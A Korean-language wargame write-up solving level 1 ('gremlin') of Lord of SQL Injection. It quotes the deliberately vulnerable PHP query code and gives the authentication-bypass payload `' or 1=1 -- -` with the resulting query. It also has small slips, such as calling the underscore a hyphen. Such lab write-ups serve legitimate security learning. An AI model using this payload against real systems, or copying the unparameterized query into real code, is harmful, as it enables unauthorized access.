# Lord of SQL Injection No.1 - gremlin
## 문제 출제 의도
가장 기초적인 SQL Injection을 통해 SQL을 이해, 제어가능 여부를 확인한다.
## 소스 코드 분석
+ 소스코드  
~~~
<?php  
    include "./config.php";  
    login_chk();  
    dbconnect();  
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");// do not try to attack another table, database!  
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");  
    $query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";  
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysql_fetch_array(mysql_query($query));
    if($result['id']) solve("gremlin");
    highlight_file(__FILE__);
?>
~~~
+ 소스 코드 분석  <hr>
    - < ?php 로 시작하고, 동시에 ?> 로 끝나는 것을 보아 php라는 것을 알 수 있다. 
    - include "./congig.php";  
      congig.php라는 분리된 파일을 외부에서 불러와 적용시킨다.
      이후 정의 한적 없는 사용자 정의 함수가 나오면 congig.php에 선언되어 있다고 추정할 수 있다.
      * **include**
      1. php의 include를 모른다면 다음 문서를 참고하자.
      2. <a href = "http://php.net/manual/kr/function.include.php">PHP: include - Manual</a>
    - login_chk();라는 함수는 로그인상태를 확인하는 함수라고 추정 가능하다.  
    - dbconnect();라는 함수는 데이터베이스와 연동하는 함수라고 추정 가능하다.  
    - if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); // do not try to attack another table, database!    
    prob, hyphon(-), period(.), parenthesis((,))등이 Get방식으로 입력받은 id에 있으면 No Hack이 출력되는 것을 알 수 있다.
    - if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");  
    prob, hyphon(-), period(.), parenthesis((,))등이 Get방식으로 입력받은 비밀번호에 있으면 No Hack이 출력되는 것을 알 수 있다.


    - **preg_match**
    1. php의 preg_match 함수에 대해 잘 모르겠다면 다음 링크를 참고하자.
    2. <a href ="http://php.net/manual/kr/function.preg-match.php">PHP: preg_match - Manual</a>
    ~~~
    int preg_match ( string $pattern , string $subject [, array &$matches [, int $flags [, int $offset ]]] )
    ~~~  
    - pattern = 찾는값
    - subject = 값을 찾을 문자열
    - array &$matches = 존재할 경우 매치되는 문자열이 해당 배열의 0번지에 할당됨.
    - flag = 추가 옵션
    - offset = 처음 검색을 시작할 다른 위치를 지정할 수 있다.(바이트 단위)
    - preg_match 함수는 반환값으로 0 또는 1을 반환하는데 매치된 값이 있다면 1을 없다면 0 을 반환한다.
    - 따라서 /prob|_|\.|\(\)와 $_GET['id']또는 $_GET['ps']즉 입력 받은 값과 비교한다. 
    - 따라서 입력받은 아이디와 비밀번호에 prob, _ , . , ( , )중 하나라도 들어있으면 No Hack ~_~이 뜨고 문제 풀이에 실패한다.  
    ~~~
    $query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysql_fetch_array(mysql_query($query));
    if($result['id']) solve("gremlin");
    ~~~
    - $query = "select id from prob_gremlin;  
    데이터 베이스의 테이블중 prob_pro_gremlin 이라는 테이블의 데이터중 id에 해당하는 부분만 선택한다. 

    - where id='{$_GET[id]}' and pw='{$_GET[pw]}'"  
    id와 password가 입력값인 줄을 선택한다.
## 문제 해결
+ 풀이 방법 <hr>
    <p style ="font-size:20px;">WHERE 조건절 무력화</p>

    Get 방식으로 id,password를 받기 때문에 URL 다음에 다음과 같이 쿼리 스트링을 추가하면 된다. 
    ~~~
    http://los.eagle-jump.org/gremlin_bbc5af7bed14aa50b84986f2de742f31.php?id=' or 1=1 -- -
    ~~~  

    - 아이디를 비워두면 어떤 유효값도 where에 걸리지 않는다 따라서 그 뒤에 or 1=1 을 넣어 항상 참이 되게 만든다
    - 이후 password를 무시하기 위해 나머지를 주석처리 해준다. -- -
    - 따라서 결국 다음과 같은 쿼리문이 전송되어지는 것이다.
    ~~~
    select id from prob_gremlin where id='' or 1=1 -- -' and pw=''
    ~~~ 
  





    